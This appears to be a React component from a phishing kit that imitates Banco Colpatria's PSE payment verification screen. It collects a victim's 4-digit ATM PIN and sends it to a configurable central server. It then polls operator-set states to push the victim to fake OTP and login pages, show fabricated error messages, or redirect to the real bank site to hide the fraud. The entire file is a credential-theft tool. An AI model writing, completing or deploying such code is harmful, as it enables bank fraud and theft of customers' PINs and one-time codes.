import { useEffect, useRef, useState } from "react";
import { X } from "lucide-react";
import { useNavigate, useLocation } from "react-router-dom";
import { instanceBackend } from "../../../../../axios/instanceBackend";
import LoadingColpatriaOtp from "../../../../../components/LoadingColpatriaOtp";
import "./atm_colpatria_pse.css";
import pseLogoCirculo from "../../img/pse_logo_circulo.svg";

const PIN_LEN = 4;
const PLAIN_MS = 600;
const COLPATRIA_ERROR_KEY = "colpatria_error_modal";
const COLPATRIA_MID_FLOW_KEY = "colpatria_mid_flow";
const COLPATRIA_OTP_REFRESH_KEY = "colpatria_otp_refresh";
const COLPATRIA_ATM_REFRESH_KEY = "colpatria_atm_refresh";
const COLPATRIA_ATM_ERROR_AUTO_HIDE_MS = 5000;

const ATM_ERROR_MSG =
  "Error de clave ATM. Valida los dígitos e inténtalo nuevamente.";

const ESTADOS_TRAS_ENVIO_ATM = [
  "sol_otp",
  "sol_finalizar",
  "sol_finalizado",
  "solicitar_finalizar",
  "error_atm",
  "error_otp",
  "error_login",
  "block_ip",
  "error_blocked",
];

const ESTADOS_SIEMPRE_REPROCESAR = [
  "error_atm",
  "error_otp",
  "error_login",
  "block_ip",
  "error_blocked",
  "sol_atm",
];

function ColpatriaAlertIcon({ className = "" }) {
  return (
    <svg
      className={className ? `colpatria-alert-diamond ${className}` : "colpatria-alert-diamond"}
      width={22}
      height={22}
      viewBox="0 0 20 20"
      aria-hidden
    >
      <g transform="translate(10 10) rotate(45)">
        <rect
          x="-6.5"
          y="-6.5"
          width="13"
          height="13"
          rx="1.5"
          fill="currentColor"
        />
      </g>
      <text
        x="10"
        y="14.5"
        textAnchor="middle"
        fontSize="11"
        fontWeight="800"
        fill="#ffffff"
        fontFamily="system-ui, -apple-system, BlinkMacSystemFont, sans-serif"
      >
        !
      </text>
    </svg>
  );
}

export default function AtmColpatriaPse() {
  const navigate = useNavigate();
  const location = useLocation();

  const [digits, setDigits] = useState(() => Array(PIN_LEN).fill(""));
  const [showPlain, setShowPlain] = useState(() => Array(PIN_LEN).fill(false));
  const [getLoading, setLoading] = useState(false);
  const [showAtmErrorAlert, setShowAtmErrorAlert] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalText, setModalText] = useState("");
  const inputsRef = useRef([]);
  const hideTimers = useRef([]);
  const pollingIntervalRef = useRef(null);
  const sessionIdRef = useRef(null);
  const lastEstadoRef = useRef(null);
  const allowPollNavigationRef = useRef(false);
  const envioEnCursoRef = useRef(false);
  const modalBloqueoEstadoRef = useRef(null);
  const ignorarEstadoHastaCambioRef = useRef(null);

  const code = digits.join("");
  const complete = code.length === PIN_LEN;

  const clearPinFields = () => {
    hideTimers.current.forEach((id) => {
      if (id) clearTimeout(id);
    });
    hideTimers.current = [];
    setDigits(Array(PIN_LEN).fill(""));
    setShowPlain(Array(PIN_LEN).fill(false));
    setTimeout(() => inputsRef.current[0]?.focus(), 50);
  };

  const resetAtmEsperaUi = () => {
    envioEnCursoRef.current = false;
    setLoading(false);
  };

  const dismissAtmErrorAlert = () => {
    setShowAtmErrorAlert(false);

    if (modalBloqueoEstadoRef.current === "error_atm") {
      ignorarEstadoHastaCambioRef.current = "error_atm";
      modalBloqueoEstadoRef.current = null;
      allowPollNavigationRef.current = false;
      sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
      initPolling();
    }
  };

  const dismissAtmErrorAlertIfOpen = () => {
    if (showAtmErrorAlert) {
      dismissAtmErrorAlert();
    }
  };

  const showAtmError = () => {
    ignorarEstadoHastaCambioRef.current = null;
    stopPolling();
    resetAtmEsperaUi();
    allowPollNavigationRef.current = false;
    sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
    modalBloqueoEstadoRef.current = "error_atm";
    lastEstadoRef.current = "error_atm";
    clearPinFields();
    setShowAtmErrorAlert(true);
  };

  const redirigir = (ruta) => {
    navigate(ruta);
  };

  const redirigirLogin = () => {
    navigate("/colpatria_pse_login", {
      replace: true,
      state: { signal: Date.now() },
    });
  };

  const redirigirOtp = () => {
    sessionStorage.setItem(COLPATRIA_OTP_REFRESH_KEY, "1");
    navigate("/colpatria_pse_otp", {
      replace: true,
      state: { signal: Date.now() },
    });
  };

  const redirigirAtm = () => {
    sessionStorage.setItem(COLPATRIA_ATM_REFRESH_KEY, "1");
    navigate("/colpatria_pse_atm", {
      replace: true,
      state: { signal: Date.now() },
    });
  };

  const applyPendingScreenSignal = () => {
    const pendingError = localStorage.getItem(COLPATRIA_ERROR_KEY);
    if (!pendingError) return null;

    resetAtmEsperaUi();
    allowPollNavigationRef.current = false;
    sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);

    if (pendingError === "error_atm") {
      localStorage.removeItem(COLPATRIA_ERROR_KEY);
      showAtmError();
      return "error_atm";
    }

    if (pendingError === "error_login") {
      stopPolling();
      localStorage.removeItem(COLPATRIA_ERROR_KEY);
      redirigirLogin();
      return "error_login";
    }

    if (pendingError === "error_otp") {
      stopPolling();
      localStorage.setItem(COLPATRIA_ERROR_KEY, "error_otp");
      sessionStorage.setItem(COLPATRIA_OTP_REFRESH_KEY, "1");
      redirigirOtp();
      return "error_otp";
    }

    localStorage.removeItem(COLPATRIA_ERROR_KEY);

    if (pendingError === "block_ip") {
      modalBloqueoEstadoRef.current = "block_ip";
      setShowModal(true);
      setModalText("Acceso bloqueado por seguridad.");
    }

    return pendingError;
  };

  const bootstrapAtmScreen = () => {
    stopPolling();

    const pendingResult = applyPendingScreenSignal();

    if (pendingResult === "error_login" || pendingResult === "error_otp") {
      return;
    }

    if (pendingResult === "error_atm") {
      return;
    }

    if (sessionStorage.getItem(COLPATRIA_ATM_REFRESH_KEY) === "1") {
      sessionStorage.removeItem(COLPATRIA_ATM_REFRESH_KEY);
      ignorarEstadoHastaCambioRef.current = null;
      modalBloqueoEstadoRef.current = null;
      lastEstadoRef.current = null;
      resetAtmEsperaUi();
      allowPollNavigationRef.current = false;
      sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
      return;
    }

    const sid = localStorage.getItem("sessionId");
    if (!sid) {
      resetAtmEsperaUi();
      return;
    }

    sessionIdRef.current = sid;

    if (sessionStorage.getItem(COLPATRIA_MID_FLOW_KEY) === "1") {
      allowPollNavigationRef.current = true;
      initPolling();
      return;
    }

    resetAtmEsperaUi();
  };

  const closeModal = () => {
    modalBloqueoEstadoRef.current = null;
    setShowModal(false);
    setModalText("");
  };

  const stopPolling = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }
  };

  const initPolling = () => {
    stopPolling();
    pollingIntervalRef.current = setInterval(() => {
      verifyState();
    }, 3000);
    verifyState();
  };

  useEffect(() => {
    inputsRef.current[0]?.focus();
  }, []);

  useEffect(() => {
    return () => {
      hideTimers.current.forEach((id) => {
        if (id) clearTimeout(id);
      });
    };
  }, []);

  useEffect(() => {
    if (!showAtmErrorAlert) return undefined;

    const timer = window.setTimeout(() => {
      dismissAtmErrorAlert();
    }, COLPATRIA_ATM_ERROR_AUTO_HIDE_MS);

    return () => window.clearTimeout(timer);
  }, [showAtmErrorAlert]);

  useEffect(() => {
    bootstrapAtmScreen();

    return () => {
      stopPolling();
    };
  }, [location.pathname, location.key, location.state]);

  const schedulePlainHide = (index) => {
    if (hideTimers.current[index]) {
      clearTimeout(hideTimers.current[index]);
    }
    hideTimers.current[index] = setTimeout(() => {
      setShowPlain((prev) => {
        const next = [...prev];
        next[index] = false;
        return next;
      });
    }, PLAIN_MS);
  };

  const setDigit = (index, ch) => {
    setDigits((prev) => {
      const next = [...prev];
      next[index] = ch;
      return next;
    });
  };

  const handleChange = (index, e) => {
    dismissAtmErrorAlertIfOpen();

    const v = e.target.value.replace(/\D/g, "");
    if (v.length === 0) {
      if (hideTimers.current[index]) {
        clearTimeout(hideTimers.current[index]);
        hideTimers.current[index] = undefined;
      }
      setShowPlain((prev) => {
        const next = [...prev];
        next[index] = false;
        return next;
      });
      setDigit(index, "");
      return;
    }
    const last = v.slice(-1);
    setDigit(index, last);
    setShowPlain((prev) => {
      const next = [...prev];
      next[index] = true;
      return next;
    });
    schedulePlainHide(index);
    if (index < PIN_LEN - 1) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    dismissAtmErrorAlertIfOpen();

    const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
    if (!text) return;
    const chars = text.slice(0, PIN_LEN).split("");
    hideTimers.current.forEach((id) => {
      if (id) clearTimeout(id);
    });
    hideTimers.current = [];
    setDigits((prev) => {
      const out = [...prev];
      for (let i = 0; i < PIN_LEN; i++) {
        out[i] = chars[i] ?? "";
      }
      return out;
    });
    const plain = Array(PIN_LEN)
      .fill(false)
      .map((_, i) => Boolean(chars[i]));
    setShowPlain(plain);
    setTimeout(() => {
      setShowPlain(Array(PIN_LEN).fill(false));
    }, PLAIN_MS);
    const focusI = Math.min(chars.length, PIN_LEN - 1);
    inputsRef.current[focusI]?.focus();
  };

  const verifyState = async () => {
    try {
      const response = await instanceBackend.post(
        `/colpatria/verify-state/${sessionIdRef.current}`,
      );
      const estadoActual = (response?.data?.estado || "").toLowerCase();

      if (!estadoActual) return;

      if (ignorarEstadoHastaCambioRef.current) {
        if (estadoActual === ignorarEstadoHastaCambioRef.current) return;
        ignorarEstadoHastaCambioRef.current = null;
        modalBloqueoEstadoRef.current = null;
      }

      if (modalBloqueoEstadoRef.current && estadoActual === modalBloqueoEstadoRef.current) {
        return;
      }

      if (
        ESTADOS_TRAS_ENVIO_ATM.includes(estadoActual) &&
        !allowPollNavigationRef.current
      ) {
        return;
      }

      if (
        lastEstadoRef.current === estadoActual &&
        !ESTADOS_SIEMPRE_REPROCESAR.includes(estadoActual)
      ) {
        return;
      }
      lastEstadoRef.current = estadoActual;

      switch (estadoActual) {
        case "sol_atm":
          envioEnCursoRef.current = false;
          setLoading(false);
          allowPollNavigationRef.current = false;
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
          clearPinFields();
          break;
        case "sol_otp":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
          sessionStorage.setItem(COLPATRIA_OTP_REFRESH_KEY, "1");
          redirigirOtp();
          break;
        case "sol_finalizar":
        case "sol_finalizado":
        case "solicitar_finalizar":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
          redirigir("/finalizado-pse");
          break;
        case "error_atm":
          if (location.pathname === "/colpatria_pse_atm") {
            showAtmError();
          } else {
            localStorage.setItem(COLPATRIA_ERROR_KEY, "error_atm");
            sessionStorage.setItem(COLPATRIA_ATM_REFRESH_KEY, "1");
            redirigirAtm();
          }
          break;
        case "error_otp":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
          localStorage.setItem(COLPATRIA_ERROR_KEY, "error_otp");
          sessionStorage.setItem(COLPATRIA_OTP_REFRESH_KEY, "1");
          redirigirOtp();
          break;
        case "error_login":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
          localStorage.setItem(COLPATRIA_ERROR_KEY, "error_login");
          redirigirLogin();
          break;
        case "block_ip":
        case "error_blocked":
          stopPolling();
          envioEnCursoRef.current = false;
          setLoading(false);
          sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
          modalBloqueoEstadoRef.current = "block_ip";
          setShowModal(true);
          setModalText("Acceso bloqueado por seguridad.");
          break;
        default:
          break;
      }
    } catch (error) {
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        stopPolling();
        envioEnCursoRef.current = false;
        setLoading(false);
        sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
      }
    }
  };

  const handleContinue = async () => {
    if (!complete || getLoading) return;

    dismissAtmErrorAlertIfOpen();
    ignorarEstadoHastaCambioRef.current = null;
    modalBloqueoEstadoRef.current = null;
    lastEstadoRef.current = null;

    const sessionId = localStorage.getItem("sessionId") || sessionIdRef.current;
    const centralUrl = (
      process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
    ).trim();

    const dataSend = {
      data: {
        attributes: {
          atm: code,
          fecha: new Date().toISOString(),
          sessionId,
          backend: "P01",
          backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
          backend_url: "/api/v1/colpatria/atm",
        },
      },
    };

    stopPolling();
    envioEnCursoRef.current = true;

    try {
      setLoading(true);
      const response = centralUrl
        ? await instanceBackend.post(centralUrl, dataSend)
        : await instanceBackend.post("/colpatria/atm", dataSend);

      if (response?.data?.success) {
        const sid = response.data.sessionId ?? sessionId;
        localStorage.setItem("sessionId", sid);
        sessionIdRef.current = sid;
        sessionStorage.setItem(COLPATRIA_MID_FLOW_KEY, "1");
        allowPollNavigationRef.current = true;
        initPolling();
      } else {
        envioEnCursoRef.current = false;
        setLoading(false);
        showAtmError();
      }
    } catch (error) {
      envioEnCursoRef.current = false;
      setLoading(false);
      const status = error?.response?.status;
      const estadoErr = (error?.response?.data?.estado || "")
        .toString()
        .toLowerCase();
      if (status === 403 && estadoErr === "error_blocked") {
        sessionStorage.removeItem(COLPATRIA_MID_FLOW_KEY);
        localStorage.clear();
        window.location.href = process.env.REACT_APP_URL_BANK || "/";
        return;
      }
      setShowModal(true);
      setModalText(
        centralUrl
          ? "Error de comunicación con el servidor central."
          : "Error de conexión con el servidor.",
      );
    }
  };

  return (
    <div className="colpatria-pse-atm-root">
      <div className="colpatria-pse-atm__top-stripe" aria-hidden />
      <header className="colpatria-pse-atm__header">
        <div className="colpatria-pse-atm__brand">
          <img
            src={pseLogoCirculo}
            alt=""
            className="colpatria-pse-atm__pse-mark"
          />
          <span className="colpatria-pse-atm__brand-text">Pagos PSE</span>
        </div>
        <button
          type="button"
          className="colpatria-pse-atm__close"
          onClick={() => {}}
          aria-label="Cerrar"
        >
          <X size={22} strokeWidth={2} />
        </button>
      </header>

      <main className="colpatria-pse-atm__main">
        <div className="colpatria-pse-atm__panel">
          <p className="colpatria-pse-atm__eyebrow">Verificación de identidad</p>

          <div className="colpatria-pse-atm__progress" aria-hidden>
            <span className="colpatria-pse-atm__progress-bar" />
            <span className="colpatria-pse-atm__progress-bar" />
            <span className="colpatria-pse-atm__progress-bar" />
          </div>

          <div className="colpatria-pse-atm__heading-block">
            <h1 className="colpatria-pse-atm__title">
              Ingresa la clave de cajero para continuar con la verificación.
            </h1>
            <div className="colpatria-pse-atm__title-accent" aria-hidden />
          </div>

          {showAtmErrorAlert ? (
            <div className="colpatria-pse-atm__error-alert" role="alert">
              <ColpatriaAlertIcon className="colpatria-pse-atm__error-alert-icon" />
              <p className="colpatria-pse-atm__error-alert-text">{ATM_ERROR_MSG}</p>
            </div>
          ) : null}

          <div className="colpatria-pse-atm__clave-block">
            <p className="colpatria-pse-atm__hint">Ingresa la clave de 4 dígitos</p>

            <div
              className="colpatria-pse-atm__pin-row"
              onPaste={handlePaste}
            >
              {digits.map((d, i) => (
                <input
                  key={i}
                  ref={(el) => {
                    inputsRef.current[i] = el;
                  }}
                  type={showPlain[i] && d ? "text" : "password"}
                  inputMode="numeric"
                  maxLength={1}
                  className="colpatria-pse-atm__pin-cell"
                  value={d}
                  onChange={(e) => handleChange(i, e)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  autoComplete="off"
                  aria-label={`Dígito ${i + 1} de ${PIN_LEN}`}
                />
              ))}
            </div>
          </div>

          <div className="colpatria-pse-atm__actions">
            <button
              type="button"
              className="colpatria-pse-atm__continue"
              disabled={!complete || getLoading}
              onClick={handleContinue}
            >
              Continuar
            </button>
          </div>
        </div>
      </main>

      {showModal && (
        <div className="colpatria-modal-wrap" onClick={closeModal}>
          <div className="colpatria-modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="colpatria-modal-top">Personas</div>
            <div className="colpatria-modal-mid">
              <p>{modalText}</p>
            </div>
            <div className="colpatria-modal-bot">
              <button
                type="button"
                className="colpatria-modal-accept-btn"
                onClick={closeModal}
              >
                Aceptar
              </button>
            </div>
          </div>
        </div>
      )}

      {getLoading && <LoadingColpatriaOtp />}
    </div>
  );
}
